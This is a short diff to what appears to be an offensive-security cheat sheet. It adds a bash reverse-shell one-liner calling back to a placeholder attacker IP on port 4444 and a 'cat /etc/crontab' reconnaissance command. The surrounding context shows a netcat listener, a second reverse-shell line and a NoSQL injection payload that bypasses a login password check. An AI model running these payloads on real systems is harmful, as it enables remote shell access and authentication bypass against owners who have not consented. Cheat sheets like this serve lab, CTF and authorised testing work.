@@ -190,6 +190,10 @@ nc -lvnp 4444
 ## Bash Reverse Shells
 
 ```bash
+bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
+```
+
+```bash
 echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > script.sh
 ```
 
@@ -248,6 +252,12 @@ use
 
 ```
 {"username":"test","password":{"$ne":""}}
+```
+
+# Crontab
+
+```bash
+cat /etc/crontab
 ```
 
 # Online Tools and Resources
